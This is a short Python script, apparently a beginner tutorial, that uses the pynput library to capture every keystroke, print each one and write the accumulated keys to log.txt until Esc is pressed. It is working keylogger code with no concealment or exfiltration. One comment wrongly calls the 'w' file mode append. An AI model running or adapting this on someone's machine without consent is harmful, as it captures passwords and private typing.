# Import the necessary modules from the pynput package
from pynput.keyboard import Key, Listener
 
keys = []

def on_press(key):

# This function is called whenever a key is pressed. It logs the key and writes it to a file.
 
# Add the pressed key to the keys list
    keys.append(key)

# Call the write_file function to save the key to a file
    write_file(keys)
# Try to print the key details
    try:
        print('Alpha_Numaric key {0} pressed'.format(key.char))
    except AttributeError:
        print('Special Key{0} pressed'.format(key))

# Define the function to write logged keys to a file
def write_file(keys):

# Open the log file in append mode ('a')
    with open('log.txt','w') as f:
 # Convert the key to a string and clean up unwanted characters

        for key in keys:
            # Removing Space ''
            k = str(key).replace("'", "")
            f.write(k)

            #every KeyStroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))

    if key == Key.esc:
        # Stop listner
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    """
    This block initializes and starts the Listener.
    It listens for keyboard events and calls the on_press and on_release functions.
    """
    listener.join()  # Keeps the listener running until explicitly stopped̥
